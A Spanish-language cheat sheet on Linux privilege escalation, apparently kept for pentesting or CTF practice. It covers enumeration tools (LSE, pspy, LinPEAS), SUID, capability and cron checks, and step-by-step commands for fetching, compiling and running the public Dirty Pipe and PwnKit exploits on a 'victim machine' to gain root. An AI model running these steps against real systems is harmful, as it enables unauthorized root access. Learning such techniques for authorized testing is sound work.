# Escalacion de privilegios Linux

Tags: #Linux #Escalada #Root #Privilegios #Capabilities #SUID #LSE #PSPY #LinPEAS #CRON #Netstat #GCC

* [Hacktricks](https://book.hacktricks.xyz/welcome/readme)
* [GTFOBins](https://gtfobins.github.io/)

## Enumeracion Tools Automaticas Enumeration

-   [LSE](https://github.com/diego-treitos/linux-smart-enumeration)

Esta herramienta nos ayudar a identificar vulnerabilidades para poderla explotar y escalar privilegios.
	**lse.sh** > Mirar en modo Raw
	Copiar la url resultante en Raw 

```bash
❯ wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh # Binario que debemos de descargar
❯ chmod +x lse.                     # Le damos permisos de ejecucion 
❯ ./lse.sh                          # Ejecutamos el binario

	# h = Panel de ayuda
``` 


-   [PSPY](https://github.com/DominicBreuker/pspy)

Esta herramienta nos ayudara a identificar tareas, procesos que se estan ejecutando.
	Releases > Improved troubleshooting > **pspy64** -> Binario que debemos de descargar

```bash
❯ ./pspy                            # Ejecutamos el binario 
```


* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)     ->     Para descragar el binario debemos de ir a **'Quick Start > the releases page > linpeas.sh'**
```bash
❯ chmod 777 linpeas.sh                   # Agregamos los privilegios para poder ejecutarlo en la maquina victima
❯ ./linpeas.sh                           # Para ejecutar el binario, podremos ver los diferentes colores y ahi podremos ver en donde es mas facil poder hacer el (PE=Privilege Escalation)

	# Podremos encontrar archivos o passwds

❯ ./linux-exploit-suggester.sh           # Podemos ver los CVE potenciales
```


## Manual 

```bash
❯ sudo -l                                          # Ver que permisos tenemos en el sudoers (l=ele)

	# (ALL : ALL) ALL
	# (root) NOPASSWD: /usr/bin/find -> Puede ejecutar un comando sin necesidad de password
```

```bash
❯ su root                                          # Para convertirnos en root y debemos de proporcionar una passwd
```

```bash
❯ uname -a                                         # Miramos informacion del Kernel
```

```bash
❯ id                                               # Para ver si estamos en un grupo especial
```

```bash
❯ ./bash -p                                        # Y asi obtenemos la bash del root, esta debe tener permisos SUID con la flag 's'

	# p = privilege
```

```bash
❯ netstat -nat                                    # Podemos ver los puertos abiertos internos 

	# 27017 = Mongo el cual podemos usar para buscar usuario y passwd
```


#### gcc

* [Dirty-Pipe-Arinerron](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)

```bash
❯ which gcc                                       

	# /usr/bin/gcc = El Dirty-Pipe nos ayudara a sobre-escribir el ''/etc/passwd' 
	# En la pagina de Arinerron nos vamos a 'exploit.c' despues le damos a RAW y copiamos el contenido en un archivo llamado 'priv.c' en la maquina victima en el dir '/tmp'

❯ gcc privesc.c -o privesc                       # Asi lo compilamos en la maquina victima
❯ ./privesc.c                                    # Ejecutamos el binario y nos convierte en root, ya que coloca a 'aaron' como usuario root y su passwd 'aaron'
❯ su root                                        # Cambiar a usuario root con el nombre aaron seteado
```

#### Privilegios SUID

* [GTFOBins](https://gtfobins.github.io/)
* [Pkexec-PwnKit](https://github.com/berdav/CVE-2021-4034)

Podemos ver en esa pagina que comando podemos usar si encontramos un permiso SUID
```bash 
❯ find / -perm -4000 -ls 2>/dev/null               # Buscaremos por privilegios SUID, con ls = Miramos los privilegios y buscamos los de root

	# /usr/bin/pkexec = Vulnerable al PwnKit           
```

```bash
# Para el Pkexec en la maquina de atacante 
❯ git clone https://github.com/berdav/CVE-2021-4034          # Nos descargara un archivo el cual debemos de comprimir y pasarlo a la maquina victima por http
❯ zip -r comprimido.zip CVE-2021-4034/                       # Comprimimos el archivo CVE y le ponemos de nombre 'comprimido.zip' 

# Para el Pkexec en la maquina victima
❯ unzip comprimido.zip                                       # Descomprimimos el archivo .zip
❯ cd CVE-2021-4034/                                          # Nos dirigimos al directorio
❯ make                                                       # Compilamos todo lo que se encuentra ahi
❯ ./cve-2021-4034                                            # Ejecutamos el archivo .sh y con eso nos convertimos en root
```

#### Capabilities

```bash
❯ which getcap                             # Para ver si esta instalado el Getcap y mirar las capabilities

❯ getcap -r / 2>/dev/null                  # Listamos las capabilities que existan desde la raiz de forma recursiva y buscamos el comando aqui GTFOBins [GTFOBins](https://gtfobins.github.io/)

Tipos de capabilities:
	# /usr/bin/perl cap_setuid+ep = Esta capabilitie nos permite gestionar el UID y hacer que opere como root
	# /usr/bin/python3.9  cap_setuid+ep = Esta capabilitie nos permite gestionar el UID y hacer que opere como root
```


#### Tareas CRON

```bash
❯ cat /etc/crontab                   # Tareas CRON: son tareas que se ejecutan a intervalos regulares de tiempos en el sistema 
❯ crontab -l                         # Ver las tareas CRON (l=ele) del sistema
❯ cat /etc/crontab                   # Ver el archivo como se estan ejecutando las tareas CRON
```

* Podemos crearnos un Script Manual para ver las tareas que se estan ejecutando y ver lor procesos nuevos, antiguos, asi como comandos y ver cual proceso nos puede ayudar a escalar privilegios. 
   Despues encontramos un archivo que lo esta ejecutando root y otros lo pueden modificar 
```bash 
❯ nano file.sh

	#!/bin/bash
	
	function ctrl_c(){
		echo -e "\\n[!] Saliendo \\n"
		tput cnorm; exit 1
	}
	
	# Ctrl + c
	trap ctrl_c INT
	tput civis
	old_process="$(ps -eo command)"

	while true; do
		new_process="$(ps -eo command)"
		diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker"
		old_process=$new_process
	done	
```

```bash
❯ systemctl list-timers              # Para ver cada cuanto tiempo se ejecuta una tarea
```

---
